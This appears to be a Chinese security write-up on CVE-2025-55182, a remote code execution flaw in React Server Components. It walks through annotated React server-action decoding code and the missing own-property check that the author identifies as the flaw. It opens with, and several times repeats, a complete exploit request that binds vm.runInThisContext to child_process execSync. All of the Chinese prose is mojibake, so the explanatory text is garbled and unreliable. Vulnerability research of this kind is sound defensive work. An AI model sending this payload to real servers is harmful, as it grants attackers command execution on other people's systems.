æˆ‘ä»¬æäº¤çš„POSTè¯·æ±‚åŒ…ä¸º

```http
POST /formaction HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name=&#34;$ACTION_REF_0&#34;

------Boundary
Content-Disposition: form-data; name=&#34;$ACTION_0:0&#34;

{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;]}
------Boundary--
```

Node.js HTTPæœåŠ¡å¤„ç†POSTè¯·æ±‚ï¼Œè§£æ Multipart è¡¨å•ï¼Œä½¿ç”¨ `parseMultipart(buffer, boundary)` å¾—åˆ°

```js
formData = new Map([
  [&#39;$ACTION_REF_0&#39;, &#39;&#39;],
  [&#39;$ACTION_0:0&#39;, &#39;{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;...&#34;]}&#39;]
]);
```

### decodeAction è§£æè¯·æ±‚

RSC ä¼šæŠŠå‰ç«¯æäº¤çš„ FormData é‡Œé¢çš„å­—æ®µ `&#34;$$ACTION_ID&#34;`æ˜ å°„åˆ°æœåŠ¡å™¨ä¸Šçš„æŸä¸ªçœŸå®å‡½æ•°ã€‚

ä¾‹å¦‚ï¼š`&lt;form action={saveFeedback}&gt;`ï¼Œå®¢æˆ·ç«¯ POST çš„å†…å®¹ä¼šå˜æˆï¼š`action=FeedbackActions.saveFeedback`

 decodeActionå‡½æ•°å°±æ˜¯ä¸€ä¸ªåŠ¨æ€è·¯ç”±åŠŸèƒ½ï¼Œè´Ÿè´£æ‰¾åˆ°å¯¹åº”çš„æœåŠ¡ç«¯å‡½æ•°ï¼Œæä¾›åç»­è°ƒç”¨ã€‚

```js
const actionFn = await decodeAction(formData, serverManifest);
```

server.js æ˜¯ç›´æ¥è°ƒç”¨äº† decodeActionï¼Œ ç”¨äºå°†å®¢æˆ·ç«¯ Action æè¿°è½¬æ¢ä¸ºå¯æ‰§è¡Œå‡½æ•°ã€‚

1. ä» formData æ‰¾åˆ° action å­—æ®µ
2. ä» serverManifest æ‰¾åˆ°æ¨¡å—å
3. åŠ¨æ€ require() æ¨¡å—
4. è¿”å›æ¨¡å—é‡Œçš„å‡½æ•°å¼•ç”¨

ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªå‡½æ•°èƒ½æ ¹æ®ç”¨æˆ·è¾“å…¥å­—ç¬¦ä¸²ï¼ŒåŠ¨æ€åŠ è½½ æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ¨¡å—ã€ä»»æ„å‡½æ•°ã€‚

åœ¨Reactä¸­ï¼Œè¯¥å‡½æ•°ä½äº`packages/react-server/src/ReactFlightActionServer.js`

è¿™é‡Œå®éªŒç¯å¢ƒä¸‹ï¼Œæ·»åŠ æ³¨é‡Šåçš„ä»£ç å¦‚ä¸‹ï¼š

```js
/** 
* Server Actions çš„æ ¸å¿ƒè§£ç å‡½æ•°ï¼šè§£æè¯·æ±‚ä½“ä¸­çš„æœåŠ¡ç«¯ Action ä¿¡æ¯ï¼ŒåŠ è½½å¯¹åº”å‡½æ•°å¹¶ç»‘å®šè¡¨å•æ•°æ®
* @param {Iterable} body - RSC è¯·æ±‚ä½“ï¼ˆFormDataæ ¼å¼ï¼‰ï¼ŒåŒ…å« Action æ ‡è¯†å’Œè¡¨å•æ•°æ®
* @param {Object} serverManifest - æœåŠ¡ç«¯æ¸…å•ï¼Œå­˜å‚¨ Action ID ä¸æœåŠ¡ç«¯å‡½æ•°çš„æ˜ å°„å…³ç³»
* @returns {Promise&lt;Function&gt;|null} - ç»‘å®šäº†è¡¨å•æ•°æ®çš„Server Action å‡½æ•°ï¼ˆPromise å½¢å¼ï¼‰ï¼Œæ—  Action åˆ™è¿”å› null
*/
exports.decodeAction = function (body, serverManifest) {
  var formData = new FormData(),
    action = null;
  body.forEach(function (value, key) {
    key.startsWith(&#34;$ACTION_&#34;)
      // åˆ†æ”¯1ï¼šå¤„ç†å¸¦ç»‘å®šå…ƒæ•°æ®çš„Actionï¼ˆ$ACTION_REF_å‰ç¼€ï¼Œå«ç»‘å®šå‚æ•°ï¼‰
      ? key.startsWith(&#34;$ACTION_REF_&#34;)
        ? (
          // 1. é‡æ„Actionæ ‡è¯†æ ¼å¼ï¼Œæ‹¼æ¥ä¸ºæ ‡å‡†Actionæ ‡è¯†
          (value = &#34;$ACTION_&#34; &#43; key.slice(12) &#43; &#34;:&#34;),
          // 2. è§£ç ç»‘å®šçš„Actionå…ƒæ•°æ®ï¼Œä»è¯·æ±‚ä½“ä¸­æå–å¹¶è§£æç»‘å®šå‚æ•°
          (value = decodeBoundActionMetaData(body, serverManifest, value)
          ),
          // 3. æ ¹æ®IDå’Œç»‘å®šå‚æ•°åŒ¹é…æœåŠ¡ç«¯å‡½æ•°ï¼Œä»æœåŠ¡ç«¯æ¸…å•åŠ è½½å¯¹åº”çš„Actionå¼•ç”¨ï¼ˆæ ¸å¿ƒï¼‰
          (action = loadServerReference(
            serverManifest,   // æœåŠ¡ç«¯Actionæ˜ å°„æ¸…å•
            value.id,         // Actionå”¯ä¸€æ ‡è¯†
            value.bound       // Actionç»‘å®šçš„å‚æ•°
          )))
        // åˆ†æ”¯2ï¼šå¤„ç†æ™®é€šAction
        : key.startsWith(&#34;$ACTION_ID_&#34;) &amp;&amp;
          // 1. æˆªå–Action ID
          ((value = key.slice(11)),
          // 2. åŠ è½½æœåŠ¡ç«¯Actionå¼•ç”¨ï¼ˆæ— ç»‘å®šå‚æ•°ï¼‰
          (action = loadServerReference(serverManifest, value, null)))
        // åˆ†æ”¯3ï¼šæ™®é€šè¡¨å•æ•°æ®ï¼Œæ·»åŠ åˆ°FormDataä¸­ä¾›Actionä½¿ç”¨
      : formData.append(key, value);
  });
  // æœ€ç»ˆè¿”å›é€»è¾‘ï¼šæ— Actionåˆ™è¿”å›nullï¼Œæœ‰åˆ™ç»‘å®šFormDataåè¿”å›
  return null === action
    ? null
    : action.then(function (fn) {
        return fn.bind(null, formData);
      });
};
```

ä½œç”¨ï¼šè§£æ FormDataï¼Œè¯†åˆ« `$ACTION_REF_ `æˆ– `$ACTION_ID_`å­—æ®µï¼Œè°ƒç”¨ loadServerReference åŠ è½½ç›¸åº”`Action ID`æ¨¡å—æˆ–è€…å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªç»‘å®š FormData çš„æœåŠ¡å™¨å‡½æ•°

```
$ACTION_REF_0=
$ACTION_0:0={&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;]}
```

è¯»å– $ACTION_0:0 çš„å€¼ï¼Œæ‹†åˆ† id å­—æ®µï¼š
```js
moduleName = &#34;vm&#34;
exportName = &#34;runInThisContext&#34;
```
ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ç±»Actionå­—æ®µï¼š `$ACTION_REF_*` å’Œ `$ACTION_ID_*` ï¼Œæˆ‘ä»¬åšä¸‹è§£é‡Šï¼š

React Server Actions é€šè¿‡Â `$ACTION_REF_*`Â å’ŒÂ `$ACTION_ID_*`Â ä¸¤ç±»å­—æ®µå®ç°æœåŠ¡ç«¯å‡½æ•°è°ƒç”¨ã€‚

- **`$ACTION_REF_`** å¼€å¤´ï¼šç»‘å®š action å®¢æˆ·ç«¯ç”¨äºå¼•ç”¨å·²æœ‰çš„æœåŠ¡å™¨ Action å®ä¾‹ã€‚

åœ¨å®é™…é€»è¾‘ä¸­`$ACTION_REF_` å…è®¸å®¢æˆ·ç«¯ä¼ªé€  action å®ä¾‹ &#43; ä¼ªé€  bound å‚æ•° â†’ å¯¼è‡´â€œåˆ›å»ºä¸€ä¸ªæ–°çš„ action å®ä¾‹â€

ä¾‹å¦‚ï¼šæ„é€ äº†ä¸€å † multipart å­—æ®µ
```js
$ACTION_REF_999=1
$ACTION_999:0=hello
$ACTION_999:1=world
```

decodeActionè¿›è¡Œè§£æï¼š
```js
value = &#34;$ACTION_&#34; &#43; key.slice(12) &#43; &#34;:&#34;;    // é€šè¿‡è¿™é‡Œå°±ä¼šå˜æˆ$ACTION_999:
// decodeAction ä¸ä»…â€œå¼•ç”¨ç°æœ‰ actionâ€ï¼Œè€Œæ˜¯ç›´æ¥è®©å®¢æˆ·ç«¯åˆ›å»ºäº† action å®ä¾‹å‘½åç©ºé—´ã€‚
value = decodeBoundActionMetaData(body, serverManifest, value);
// ç„¶åå°±ä¼šå»æ‰«æ$ACTION_999:*æ‰€æœ‰çš„
// æœ€åè¿”å›çš„å°±æ˜¯
{ id: &#34;999&#34;, bound: [&#34;hello&#34;, &#34;world&#34;]}
```




- **`$ACTION_ID_`** æœ€å¸¸è§çš„ç”¨äºæ¨¡å—è°ƒç”¨

å¦‚ç”¨æˆ·æäº¤äº†ä¿®æ”¹å¯†ç è¯·æ±‚

```xml
&lt;form action={updatePassword}&gt;
  &lt;input type=&#34;password&#34; name=&#34;newPassword&#34; /&gt;
  &lt;button type=&#34;submit&#34;&gt;Update Password&lt;/button&gt;
&lt;/form&gt;
```

ç”Ÿæˆäº†FormDataå°±ä¼šå˜æˆï¼š`$ACTION_ID_UserActions.updatePassword = &#34;&#34;`

æœåŠ¡å™¨å°±ä¼šå»æ‰¾**updatePassword** å‡½æ•°
```js
loadServerReference(serverManifest, &#34;UserActions&#34;, &#34;updatePassword&#34;);
```

è¿˜æœ‰å°±æ˜¯åˆ†æ¨¡å—çš„è°ƒç”¨ï¼Œå¦‚`$ACTION_ID_OrderActions.createOrder = &#34;&#34;`ï¼Œè§£ææˆå°±ä¼š

```js
loadServerReference(serverManifest, &#34;OrderActions&#34;, &#34;createOrder&#34;);
```

é€šè¿‡ `$ACTION_ID_*` å­—æ®µï¼ŒReact ç¡®ä¿è°ƒç”¨ `OrderActions` æ¨¡å—ä¸­çš„ `createOrder` æ–¹æ³•ã€‚


### loadServerReference åŠ è½½
ä¸­é—´å‡½æ•°ï¼šloadServerReference()ï¼Œå®ƒæ˜¯ã€ŒæœåŠ¡ç«¯å¼•ç”¨æ ‡è¯†ï¼ˆ Action IDï¼‰ã€åˆ°ã€Œå®é™…å¯æ‰§è¡Œçš„æœåŠ¡ç«¯å‡½æ•°ã€çš„æ¡¥æ¢ â€”â€” å®¢æˆ·ç«¯å‘èµ· Server Actions è¯·æ±‚æ—¶ï¼Œä»…ä¼ é€’ Action ID ç­‰è½»é‡æ ‡è¯†ï¼Œè€Œè¯¥å‡½æ•°è´Ÿè´£æ ¹æ®æ ‡è¯†æ‰¾åˆ°å¹¶åŠ è½½å¯¹åº”çš„æœåŠ¡ç«¯å‡½æ•°ã€‚

æ¥çœ‹ä»£ç ï¼Œæ·»åŠ æ³¨é‡Šåå¦‚ä¸‹ï¼›
```js
/**
* åŠ è½½æœåŠ¡ç«¯å¼•ç”¨ï¼ˆServer Referenceï¼‰å¯¹åº”çš„å‡½æ•°ï¼šæ ¹æ® Action ID è§£æå¹¶åŠ è½½æœåŠ¡ç«¯æ³¨å†Œçš„å‡½æ•°ï¼Œæ”¯æŒç»‘å®šé¢„è®¾å‚æ•°ï¼ˆboundï¼‰ï¼Œå®ç° Server Actions å‡½æ•°å®ä¾‹åŒ–
*
* @param {Object} bundlerConfig - æ„å»ºå·¥å…·é…ç½®ï¼ŒåŒ…å«æœåŠ¡ç«¯æ¨¡å—/Action çš„æ˜ å°„å…³ç³»
* @param {string} id - æœåŠ¡ç«¯å¼•ç”¨çš„å”¯ä¸€æ ‡è¯†ï¼Œå¦‚ Action IDï¼Œå¯ç”±å®¢æˆ·ç«¯è¯·æ±‚ä¼ å…¥
* @param {Array|null} bound - å¯é€‰çš„ç»‘å®šå‚æ•°æ•°ç»„ï¼Œç”¨äºç»™æœåŠ¡ç«¯å‡½æ•°é¢„è®¾å…¥å‚ï¼ˆå¦‚ç»„ä»¶ä¸Šä¸‹æ–‡ã€å…ƒæ•°æ®ï¼‰
* @returns {Promise&lt;Function&gt;} - è§£æåçš„æœåŠ¡ç«¯å‡½æ•°ï¼ˆPromise å½¢å¼ï¼‰ï¼Œè‹¥æœ‰boundåˆ™è¿”å›ç»‘å®šå‚æ•°åçš„å‡½æ•°
*/
function loadServerReference(bundlerConfig, id, bound) {
  // 1. æ ¹æ®IDå’Œæ„å»ºé…ç½®è§£æå‡ºå®Œæ•´çš„æœåŠ¡ç«¯å¼•ç”¨ä¿¡æ¯ï¼ˆå¦‚æ¨¡å—è·¯å¾„ã€å‡½æ•°åï¼‰
  // ã€å®‰å…¨é£é™©ã€‘ï¼šè‹¥idå¯æ§ä¸”æœªæ ¡éªŒï¼Œå¯èƒ½è§£æåˆ°æ¶æ„æ¨¡å—è·¯å¾„,å¦‚ vm#runInThisContext
  var serverReference = resolveServerReference(bundlerConfig, id);
  // 2. é¢„åŠ è½½æœåŠ¡ç«¯å¼•ç”¨å¯¹åº”çš„æ¨¡å—
  bundlerConfig = preloadModule(serverReference);
  // åˆ†æ”¯1ï¼šå­˜åœ¨ç»‘å®šå‚æ•°ï¼ˆboundï¼‰- éœ€å…ˆè§£æboundå’Œé¢„åŠ è½½æ¨¡å—ï¼Œå†ç»‘å®šå‚æ•°åˆ°å‡½æ•°
  return bound
    ? Promise.all([bound, bundlerConfig]).then(function (_ref) {
        _ref = _ref[0];
        // åŠ è½½æœåŠ¡ç«¯å¼•ç”¨å¯¹åº”çš„å®é™…å‡½æ•°ï¼ˆæ ¸å¿ƒï¼šä»æ¨¡å—ä¸­requireå‡ºç›®æ ‡å‡½æ•°ï¼‰
        var fn = requireModule(serverReference);
        // å°†boundå‚æ•°ç»‘å®šåˆ°å‡½æ•°ï¼ˆbindï¼‰ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºthisï¼ˆè®¾ä¸ºnullï¼‰ï¼Œåç»­æ‹¼æ¥boundæ•°ç»„ 
        // ã€æ ¸å¿ƒã€‘ï¼šæœ€ç»ˆè¿”å›çš„å‡½æ•°æ‰§è¡Œæ—¶ä¼šè‡ªåŠ¨å¸¦ä¸Šboundé¢„è®¾å‚æ•°
        return fn.bind.apply(fn, [null].concat(_ref));
      })
    // åˆ†æ”¯2ï¼šæ— ç»‘å®šå‚æ•°ï¼Œä½†é¢„åŠ è½½æ¨¡å—å­˜åœ¨ - ç­‰å¾…æ¨¡å—é¢„åŠ è½½å®ŒæˆååŠ è½½å‡½æ•°
    : bundlerConfig
      ? Promise.resolve(bundlerConfig).then(function () {
          return requireModule(serverReference);
        })
      // åˆ†æ”¯3ï¼šæ— ç»‘å®šå‚æ•°ä¸”æ— é¢„åŠ è½½æ¨¡å— - ç›´æ¥åŠ è½½æœåŠ¡ç«¯å‡½æ•°
      : Promise.resolve(requireModule(serverReference));
}
```

å…³é”®ç‚¹ï¼š
- è°ƒç”¨ resolveServerReference è§£ææ¨¡å—ID
- è°ƒç”¨ requireModule è·å–å‡½æ•°
- ä½¿ç”¨ `fn.bind.apply` ç»‘å®š bound æ•°ç»„ä½œä¸ºå‚æ•°

ä¸šåŠ¡ä»·å€¼ï¼šæ”¯æ’‘ RSC Server Actions çš„ã€Œå‚æ•°ç»‘å®šã€å’Œã€Œæ¨¡å—æ‡’åŠ è½½ã€èƒ½åŠ›ï¼Œè®©æœåŠ¡ç«¯å‡½æ•°å¯ä»¥æºå¸¦ä¸Šä¸‹æ–‡ï¼ˆå¦‚ç»„ä»¶å…ƒæ•°æ®ã€ç”¨æˆ·ä¼šè¯ï¼‰æ‰§è¡Œï¼ŒåŒæ—¶ä¿è¯æ¨¡å—åŠ è½½çš„å¼‚æ­¥æ€§ã€‚

**æ ¸å¿ƒé£é™©ç‚¹**ï¼š
- `id` å‚æ•°ç”¨æˆ·å¯æ§ä¸”æœªåšç™½åå•æ ¡éªŒï¼Œå¯èƒ½è¢«ç¯¡æ”¹æŒ‡å‘æ¶æ„æ¨¡å—è·¯å¾„ï¼ˆ`vm#runInThisContext`ï¼‰ï¼Œé€šè¿‡ `requireModule` åŠ è½½å¹¶æ‰§è¡Œæ¶æ„ä»£ç ï¼›
- `bound` å‚æ•°è‹¥æœªè¿‡æ»¤ï¼Œå¯èƒ½ä¼ å…¥æ¶æ„å‚æ•°æ•°ç»„ï¼Œé€šè¿‡ `fn.bind` ç¯¡æ”¹å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡æˆ–å…¥å‚ï¼Œè§¦å‘éé¢„æœŸè¡Œä¸ºã€‚
### resolveServerReference 
è§£æå‡½æ•°ï¼šresolveServerReferenceï¼Œæ˜¯ **Server Reference è§£æçš„æ ¸å¿ƒå…¥å£**ï¼Œä¹Ÿæ˜¯ Server Actions / æœåŠ¡ç«¯ç»„ä»¶æ¨¡å—æŸ¥æ‰¾çš„åŸºç¡€

å®ƒæ˜¯ã€ŒæŠ½è±¡çš„æœåŠ¡ç«¯å¼•ç”¨ IDã€åˆ°ã€Œå…·ä½“çš„æ¨¡å—å…ƒæ•°æ®ã€çš„è½¬æ¢å™¨ â€”â€”RSC ä¸­å®¢æˆ·ç«¯ä»…ä¼ é€’ç²¾ç®€çš„ IDï¼ˆå¦‚ `vm#runInThisContext`ï¼‰ï¼Œè¯¥å‡½æ•°è´Ÿè´£ä»æœåŠ¡ç«¯é¢„ç¼–è¯‘çš„ `Server Manifest`ï¼ˆ`bundlerConfig`ï¼‰ä¸­ï¼Œæ‰¾åˆ° ID å¯¹åº”çš„æ¨¡å—ä¿¡æ¯ï¼Œä¸ºåç»­åŠ è½½æ¨¡å—ã€æ‰§è¡Œå‡½æ•°æä¾›ä¾æ®ã€‚

æ³¨é‡Šåä»£ç å¦‚ä¸‹ï¼š
```js
/**
* è§£æ Server Reference IDï¼ˆæœåŠ¡ç«¯å¼•ç”¨æ ‡è¯†ï¼‰ï¼šæ ¹æ®æœåŠ¡ç«¯æ¸…å•ï¼ˆbundlerConfigï¼‰å’Œ Action IDï¼Œè§£æå‡ºå¯¹åº”çš„æœåŠ¡ç«¯æ¨¡å—å…ƒæ•°æ®ï¼Œå¹¶è¿”å›æ ‡å‡†åŒ–çš„æœåŠ¡ç«¯å¼•ç”¨æ•°ç»„
*
* @param {Object} bundlerConfig - æœåŠ¡ç«¯æ¸…å• Manifestï¼Œkeyä¸ºModule/Action IDï¼Œvalueä¸ºæ¨¡å—å…ƒæ•°æ®ï¼ˆåŒ…å«idã€chunksã€nameã€asyncç­‰å­—æ®µï¼‰
* @param {string} id - å¾…è§£æçš„æœåŠ¡ç«¯å¼•ç”¨å”¯ä¸€æ ‡è¯†ï¼ˆå¦‚ Action ID/æ¨¡å—IDï¼Œå¯èƒ½å¸¦#åˆ†å‰²çš„å‡½æ•°åï¼‰
* @returns {Array} - æ ‡å‡†åŒ–çš„æœåŠ¡ç«¯å¼•ç”¨æ•°ç»„ï¼Œæ ¼å¼ï¼š[æ¨¡å—ID, å…³è”çš„chunkåˆ—è¡¨, å‡½æ•°å, å¼‚æ­¥æ ‡è¯†(å¯é€‰)]
* @throws {Error} - è‹¥æœªæ‰¾åˆ°åŒ¹é…çš„æ¨¡å—ï¼ŒæŠ›å‡ºé”™è¯¯
*/
function resolveServerReference(bundlerConfig, id) {
  var name = &#34;&#34;,
    // ç¬¬ä¸€æ­¥ï¼šä»æœåŠ¡ç«¯æ¸…å•ä¸­ç›´æ¥åŒ¹é…IDå¯¹åº”çš„æ¨¡å—å…ƒæ•°æ®
    resolvedModuleData = bundlerConfig[id];
  // åˆ†æ”¯1ï¼šIDç›´æ¥åŒ¹é…åˆ°æ¨¡å—å…ƒæ•°æ®ï¼Œæå–æ¨¡å—å…ƒæ•°æ®ä¸­çš„å‡½æ•°/Actionåç§°
  if (resolvedModuleData) name = resolvedModuleData.name;
  // åˆ†æ”¯2ï¼šIDæœªç›´æ¥åŒ¹é…ï¼Œå°è¯•è§£æå¸¦#åˆ†å‰²çš„å¤åˆIDï¼ˆå¦‚ vm#runInThisContextï¼‰
  else {
    var idx = id.lastIndexOf(&#34;#&#34;);  // æ‰¾åˆ°IDä¸­åˆ†å‰²æ¨¡å—IDå’Œå‡½æ•°çš„ä½ç½®ï¼ˆæœ€åä¸€ä¸ª#ä½ç½®ï¼‰
    // è‹¥å­˜åœ¨#åˆ†éš”ç¬¦ï¼Œæ‹†åˆ†æ¨¡å—IDå’Œå‡½æ•°å
    -1 !== idx &amp;&amp;
      // æå–#åçš„éƒ¨åˆ†ä½œä¸ºå‡½æ•°/Actionåç§°
      ((name = id.slice(idx &#43; 1)),
      // æå–#å‰çš„éƒ¨åˆ†ä½œä¸ºæ¨¡å—IDï¼Œé‡æ–°ä»æ¸…å•ä¸­åŒ¹é…æ¨¡å—å…ƒæ•°æ®
      (resolvedModuleData = bundlerConfig[id.slice(0, idx)]));
    // è‹¥æ‹†åˆ†åä»æœªåŒ¹é…åˆ°æ¨¡å—å…ƒæ•°æ®ï¼ŒæŠ›å‡ºè‡´å‘½é”™è¯¯
    if (!resolvedModuleData)
      throw Error(
        â€¦â€¦
      );
  }
  // ç¬¬äºŒæ­¥ï¼šè¿”å›æ ‡å‡†åŒ–çš„æœåŠ¡ç«¯å¼•ç”¨æ•°ç»„ï¼ˆåŒºåˆ†å¼‚æ­¥/åŒæ­¥æ¨¡å—ï¼‰ 
  // å¼‚æ­¥æ¨¡å—ï¼šè¿½åŠ ç¬¬4ä¸ªå…ƒç´ ï¼ˆ1ï¼‰æ ‡è¯†å¼‚æ­¥ï¼›åŒæ­¥æ¨¡å—ï¼šä»…è¿”å›å‰3ä¸ªå…ƒç´ 
  return resolvedModuleData.async
    ? [resolvedModuleData.id, resolvedModuleData.chunks, name, 1]
    : [resolvedModuleData.id, resolvedModuleData.chunks, name];
}
```

å…³é”®ç‚¹ï¼š
- ä½¿ç”¨ `#` åˆ†å‰² IDï¼Œä¾‹å¦‚ `vm#runInThisContext` â†’ `æ¨¡å—=vm, åç§°=runInThisContext`
- è¿”å›æ•°ç»„ `[moduleId, chunks, exportName]` â†’ è¿™å°±æ˜¯ metadata

è¿™é‡Œçš„è¿”å›åŸºæœ¬å°±æ˜¯ï¼š

```
[vm,[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;],runInThisContext]
```



### requireModule
æ¼æ´å‡½æ•°ï¼šrequireModule è¯¥å‡½æ•°æ˜¯ React RSC ä¸­ **æœåŠ¡ç«¯æ¨¡å—åŠ è½½çš„æœ€ç»ˆæ‰§è¡Œå±‚**ï¼Œä¹Ÿæ˜¯ Server Actions ä»ã€Œæ¨¡å—åŠ è½½ã€åˆ°ã€Œå‡½æ•°è·å–ã€çš„æœ€åä¸€ç¯

é€šè¿‡ webpack å†…ç½®çš„ `__webpack_require__` åŠ è½½ç¼–è¯‘åçš„æœåŠ¡ç«¯æ¨¡å—ï¼Œå†æ ¹æ® RSC çº¦å®šçš„è§„åˆ™è§£æå‡ºç›®æ ‡å¯¼å‡ºé¡¹ï¼ˆå¦‚ Server Actions å¯¹åº”çš„å…·ä½“å‡½æ•°ï¼‰ï¼Œæ˜¯æœåŠ¡ç«¯æ¨¡å—ä»ã€ŒåŠ è½½ã€åˆ°ã€Œå¯ç”¨ã€çš„æ ¸å¿ƒè½¬æ¢æ­¥éª¤ã€‚


æ³¨é‡Šåä»£ç å¦‚ä¸‹ï¼š
```js
/**
* åŠ è½½æœåŠ¡ç«¯æ¨¡å—å¹¶è§£æç›®æ ‡å¯¼å‡ºé¡¹ï¼šæ ¹æ® resolveServerReference è¿”å›çš„æ ‡å‡†åŒ–æ¨¡å—å…ƒæ•°æ®ï¼Œ
* é€šè¿‡ webpack è¿è¡Œæ—¶åŠ è½½æ¨¡å—ï¼Œå¹¶æŒ‰è§„åˆ™è§£æå‡ºç›®æ ‡å‡½æ•°/å¯¼å‡ºé¡¹ï¼ˆå¦‚ Server Actions å‡½æ•°ï¼‰
*
* @param {Array} metadata - æ ‡å‡†åŒ–çš„æœåŠ¡ç«¯æ¨¡å—å…ƒæ•°æ®ï¼ˆæ¥è‡ª resolveServerReferenceï¼‰ï¼Œæ ¼å¼ï¼š[æ¨¡å—ID, chunkåˆ—è¡¨, ç›®æ ‡å¯¼å‡ºå, å¼‚æ­¥æ ‡è¯†(å¯é€‰)]
* @returns {any} - æ¨¡å—çš„ç›®æ ‡å¯¼å‡ºé¡¹ï¼ˆå‡½æ•°/å¯¹è±¡/é»˜è®¤å¯¼å‡ºç­‰ï¼‰ï¼ŒServer Actions çš„å®é™…æ‰§è¡Œå‡½æ•° 
*/
function requireModule(metadata) {
  // ç¬¬ä¸€æ­¥ï¼šé€šè¿‡ webpack è¿è¡Œæ—¶åŠ è½½æ¨¡å—ï¼Œmetadata[0]=æ¨¡å—IDï¼Œæ˜¯ webpack æ‰“åŒ…åæ¨¡å—çš„å”¯ä¸€æ ‡è¯†
  var moduleExports = __webpack_require__(metadata[0]);
  // ç¬¬äºŒæ­¥ï¼šå¤„ç†å¼‚æ­¥æ¨¡å—ï¼ˆmetadataé•¿åº¦ä¸º4è¡¨ç¤ºå¼‚æ­¥æ¨¡å—ï¼‰
  if (4 === metadata.length &amp;&amp; &#34;function&#34; === typeof moduleExports.then)
    // å¼‚æ­¥æ¨¡å—å·²å®ŒæˆåŠ è½½ï¼ˆçŠ¶æ€ä¸ºfulfilledï¼‰ï¼šæå–å®é™…çš„æ¨¡å—å¯¼å‡ºå€¼
    if (&#34;fulfilled&#34; === moduleExports.status)
      moduleExports = moduleExports.value;
    else throw moduleExports.reason;
  // ç¬¬ä¸‰æ­¥ï¼šæ ¹æ® metadata[2]ï¼ˆç›®æ ‡å¯¼å‡ºåï¼‰è§£ææ¨¡å—çš„å…·ä½“å¯¼å‡ºé¡¹ï¼ˆæ ¸å¿ƒåˆ†æ”¯é€»è¾‘ï¼‰
  return &#34;*&#34; === metadata[2]
    // åˆ†æ”¯1ï¼šå¯¼å‡ºåä¸º&#34;*&#34; â†’ è¿”å›æ•´ä¸ªæ¨¡å—çš„å¯¼å‡ºå¯¹è±¡ï¼ˆå¯¼å‡ºå…¨éƒ¨ï¼‰
    ? moduleExports
    : &#34;&#34; === metadata[2]
      // åˆ†æ”¯2ï¼šå¯¼å‡ºåä¸ºç©º â†’ ä¼˜å…ˆå–ESæ¨¡å—çš„defaulté»˜è®¤å¯¼å‡ºï¼ŒéESæ¨¡å—åˆ™è¿”å›æ•´ä¸ªæ¨¡å—
      ? moduleExports.__esModule
        ? moduleExports.default
        : moduleExports
      // åˆ†æ”¯3ï¼šæŒ‡å®šå…·ä½“å¯¼å‡ºå â†’ å–æ¨¡å—çš„å¯¹åº”å‘½åå¯¼å‡ºï¼ˆå¦‚ Server Actions å‡½æ•°åï¼‰
      : moduleExports[metadata[2]];  
}
```

æ¼æ´åœ¨è¿™è¡Œï¼š
```js
: moduleExports[metadata[2]];  // âŒ æ²¡æœ‰ hasOwnProperty æ£€æŸ¥ï¼è®¿é—®äº†åŸå‹é“¾ï¼
```

å¯ä»¥çœ‹åˆ°ï¼ŒmoduleExportsæœ‰ `child_process` çš„æ‰€æœ‰å‡½æ•°ï¼Œå¹¶ä¸”`metadata[2]`æ˜¯æˆ‘ä»¬æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è°ƒç”¨è¿™ä¸ªæ¨¡å—ä¸‹æ‰€æœ‰å‡½æ•°ï¼ˆè€ŒéserverManifestå®šä¹‰çš„ï¼‰

![img](resource/CVE-2025-55182_ReactServerComponents_RSC_RCEç ”ç©¶èµ„æ–™.assets/file-20251212094100821.png)



### vm#runInNewContext

VMæ¨¡å—åœ¨å¾ˆæ—©çš„æ—¶å€™å°±æœ‰äººç”¨å®ƒæ¥æ‰§è¡Œä»£ç ï¼Œåªä¸è¿‡ç°åœ¨æ‰ç»“åˆèµ·æ¥ç»„åˆé€ æˆrceã€‚

```js
id: &#34;vm#runInThisContext&#34;,  
bound: [  
&#34;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;
]
```

è¿™ä¸ªè¯·æ±‚ä¼šï¼š
1. åŠ è½½Â `vm`Â æ¨¡å—ï¼Œè®¿é—®Â `vm.runInThisContext`Â æ–¹æ³•
2. å°†æ”»å‡»è€…çš„ä»£ç ä½œä¸ºå‚æ•°ç»‘å®š
3. æ‰§è¡Œæ—¶è¿è¡ŒÂ `execSync(&#39;id&#39;)`ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ

`global.process`ï¼šå…¨å±€å¯¹è±¡ä¸­è·å–äº†è¿›ç¨‹çš„processå¯¹è±¡

`global.process.mainModule`ï¼šå½“å‰ç¨‹åºçš„å…¥å£æ¨¡å—ï¼Œé€šè¿‡require å¯¼å…¥ fsã€pathã€netã€httpã€child_processè¿™äº›æ¨¡å—éƒ½å¯ä»¥ï¼Œé‡‡ç”¨child_process è¿›è¡Œå‘½ä»¤æ‰§è¡Œæƒé™æ¯”è¾ƒé«˜ã€‚

ä¸Šé¢æˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªååºåˆ—åŒ–å‡ºä¸€ä¸ªæœåŠ¡å™¨å‡½æ•°å¸¦æœ‰å‘½ä»¤çš„ï¼Œè€Œå server.js ä¸‹é¢éƒ¨åˆ†ä¼šæ‰§è¡ŒæœåŠ¡å™¨Actionå‡½æ•°

```js
    // 5. æ‰§è¡ŒActionå‡½æ•°å¹¶è¿”å›ç»“æœ
    if (typeof actionFn === &#39;function&#39;) {
      // æ¨¡æ‹Ÿ â€œæ­£å¸¸ä¸šåŠ¡ action è°ƒç”¨â€
      result = actionFn();
    } else {
      result = actionFn;
    }
```

